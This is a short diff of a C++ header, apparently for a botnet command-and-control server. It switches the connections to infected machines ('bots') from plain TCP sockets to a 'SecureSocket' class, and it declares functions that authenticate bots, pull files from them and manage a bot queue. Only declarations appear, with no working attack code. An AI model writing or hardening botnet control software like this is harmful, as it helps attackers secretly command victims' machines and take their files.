@@ -2,6 +2,7 @@
 #define BOTNET_H
 
 #include "Server.h"
+#include "../Socket/SecureSocket.h"
 #include <vector>
 
 
@@ -61,7 +62,7 @@ private:
 	* Send an authentication message and waits to receive a correct answer.
 	* Return value: returns wether connection is a bot or not.
 	*/
-	bool AuthenticateBot(const tcpSocket& connection);
+	bool AuthenticateBot(const SecureSocket& connection);
 
 	/* CLI functions */
 	std::string GetCLIPrompt() const;
@@ -83,10 +84,10 @@ private:
 
 	/* Botnet commands helpers */
 	
-	void GetFileFrom(const tcpSocket& bot, const std::string& file_path);
+	void GetFileFrom(const SecureSocket& bot, const std::string& file_path);
 	std::string GetNewFileName(const std::string& file_path);
 
-	void RemoveBot(const tcpSocket& bot_to_remove);
+	void RemoveBot(const SecureSocket& bot_to_remove);
 
 	/**
 	* Reads IP from standard input, and returns the first legal
@@ -109,7 +110,7 @@ private:
 	int ReadNumber();
 
 	uint16_t ReadPort();
-	std::deque<tcpSocket> GetBotQueue();
+	std::deque<SecureSocket> GetBotQueue();
 	std::string GetSepperator() const;
 
 };
